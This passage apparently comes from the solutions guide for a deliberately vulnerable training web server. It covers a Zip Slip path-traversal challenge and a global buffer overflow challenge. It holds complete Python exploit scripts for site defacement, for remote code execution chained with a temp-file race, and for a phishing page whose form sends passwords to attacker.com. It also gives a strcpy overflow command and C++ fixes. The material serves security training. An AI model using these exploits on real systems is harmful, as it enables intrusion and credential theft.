    // No canonicalization! file_stat.m_filename can contain ../
    write_file(output_path, file_data, uncompressed_size);
}
```

**Attack 1: Overwrite main site (defacement)**

```python
#!/usr/bin/env python3
import zipfile
import requests

# Create malicious HTML
with open('defaced.html', 'w') as f:
    f.write('<h1>Site Compromised!</h1><p>Zip Slip vulnerability exploited</p>')

# Create ZIP with path traversal
# From serve/deploy/, go up to serve/, then overwrite index.html
with zipfile.ZipFile('evil.zip', 'w') as z:
    z.write('defaced.html', arcname='../index.html')

# Upload to vulnerable endpoint
r = requests.post(
    'http://127.0.0.1:8081/admin/deploy_site',
    auth=('admin', 'admin'),
    data=open('evil.zip', 'rb').read(),
    headers={'Content-Type': 'application/zip'}
)

print(r.json())

# Verify defacement
r = requests.get('http://127.0.0.1:8081/')
print(r.text)  # Shows "Site Compromised!"
```

**Attack 2: Chain with CH-06 for RCE**

Combine Zip Slip with the temp executable race (CH-06) to achieve
command execution:

```python
#!/usr/bin/env python3
import zipfile
import requests
import time

# Step 1: Get server PID from /status
status = requests.get('http://127.0.0.1:8081/status').json()
pid = status.get('pid', 'unknown')
print(f"[*] Server PID: {pid}")

# Step 2: Create malicious executable payload
payload = b'#!/bin/sh\nid > /tmp/pwned\necho "Content-Type: text/plain"\necho ""\necho "RCE via Zip Slip + Temp Race"\n'

with open('payload.sh', 'wb') as f:
    f.write(payload)

# Step 3: Create ZIP with traversal to /tmp/dvws_cgi_<pid>
# From serve/deploy/ we need to traverse:
#   serve/deploy/ -> serve/ -> repo_root/ -> / -> tmp/
traversal_path = f'../../../../../../../../tmp/dvws_cgi_{pid}'

with zipfile.ZipFile('rce.zip', 'w') as z:
    z.write('payload.sh', arcname=traversal_path)

# Step 4: Deploy the ZIP (writes to /tmp)
r = requests.post(
    'http://127.0.0.1:8081/admin/deploy_site',
    auth=('admin', 'admin'),
    data=open('rce.zip', 'rb').read(),
    headers={'Content-Type': 'application/zip'}
)
print(f"[*] Deploy response: {r.json()}")

# Step 5: Make the file executable
import os
os.chmod(f'/tmp/dvws_cgi_{pid}', 0o755)

# Step 6: Trigger CH-06 - race to execute before server overwrites
r = requests.get('http://127.0.0.1:8081/cgi-helper')
print(f"[*] CGI response: {r.text}")

# Step 7: Check for command execution
time.sleep(0.5)
try:
    with open('/tmp/pwned', 'r') as f:
        print(f"[+] RCE successful! Output: {f.read()}")
except FileNotFoundError:
    print("[-] RCE failed - timing issue or permissions")
```

**Attack 3: Overwrite admin panel for phishing**

```python
import zipfile
import requests

# Create fake login page
phishing_html = '''<!DOCTYPE html>
<html><head><title>Admin Console | DVWS</title></head>
<body>
<h1>Session Expired</h1>
<p>Please re-enter your credentials:</p>
<form action="https://attacker.com/collect" method="post">
  Username: <input type="text" name="user"><br>
  Password: <input type="password" name="pass"><br>
  <button type="submit">Login</button>
</form>
</body></html>'''

with open('phishing.html', 'w') as f:
    f.write(phishing_html)

# Overwrite serve/admin/index.html
with zipfile.ZipFile('phish.zip', 'w') as z:
    z.write('phishing.html', arcname='../../admin/index.html')

# Deploy
r = requests.post(
    'http://127.0.0.1:8081/admin/deploy_site',
    auth=('admin', 'admin'),
    data=open('phish.zip', 'rb').read(),
    headers={'Content-Type': 'application/zip'}
)

print("[+] Admin panel replaced with phishing page")
print("[*] Victims visiting /admin/ will see the fake login")
```

**The fix**: Validate extraction paths before writing:

```cpp
#include <filesystem>

namespace fs = std::filesystem;

// Canonicalize both the base and target paths
fs::path deploy_base = fs::canonical(deploy_dir);

for (int i = 0; i < num_files; i++) {
    mz_zip_archive_file_stat file_stat;
    mz_zip_reader_file_stat(&zip, i, &file_stat);
    
    // Build target path
    fs::path target = deploy_base / file_stat.m_filename;
    
    // Resolve .. sequences and symlinks
    fs::path resolved = fs::weakly_canonical(target);
    
    // Check that resolved path is still under deploy_base
    auto [base_end, resolved_end] = std::mismatch(
        deploy_base.begin(), deploy_base.end(),
        resolved.begin(), resolved.end()
    );
    
    if (base_end != deploy_base.end()) {
        // Path escaped deployment directory
        fprintf(stderr, "[deploy] Rejected path traversal: %s\n", 
                file_stat.m_filename);
        continue;  // Skip this entry
    }
    
    // Safe to extract
    write_file(resolved.c_str(), file_data, uncompressed_size);
}
```

Alternatively, reject entries with suspicious patterns:

```cpp
// Simple but less robust: string-based filtering
if (strstr(file_stat.m_filename, "..") != nullptr ||
    file_stat.m_filename[0] == '/') {
    fprintf(stderr, "[deploy] Rejected suspicious filename: %s\n",
            file_stat.m_filename);
    continue;
}
```

---

<a id="challenge-13"></a>

## 13 · Global Buffer Overflow — argv (CWE-121)

### Scenario

`main()` copies `argv[1]` (the server document root) into the 200-byte
global `SERVER_DIR` with `strcpy`. Because the destination is in `.bss`
and not on the stack, the primitive is *adjacent-global corruption* rather
than a classic saved-return-address smash — but it still corrupts nearby
program state.

### Endpoint

Not network-reachable: local process invocation.

### Sink

`main.cpp` — `strcpy(SERVER_DIR, argv[1]);`

### Hints

1. What globals live near `SERVER_DIR` in the linker map?
2. Anything the server later `strcat`s onto `SERVER_DIR` will inherit the corruption.

### Expected primitive

Adjacent-global corruption; realistic damage depends on link order.

### Chaining

Bonus — outside the tracks.

### Regression test

`tests/exploit/test_argv_bof.py` (asserts the vulnerable pattern is still present)

<a id="solution-13"></a>

### Solution — 13 · Global Buffer Overflow (argv)

**Code**: `main.cpp` → `strcpy(SERVER_DIR, argv[1]);`

```bash
./damn_vulnerable_web_server "$(python3 -c 'print("A"*400)')" 8081
```

Because `SERVER_DIR` sits in `.bss`, the damage depends on what the
linker placed after it. On the current build layout, adjacent globals
include the sessions map and OpenSSL state; sending any request that
touches those triggers observable corruption.
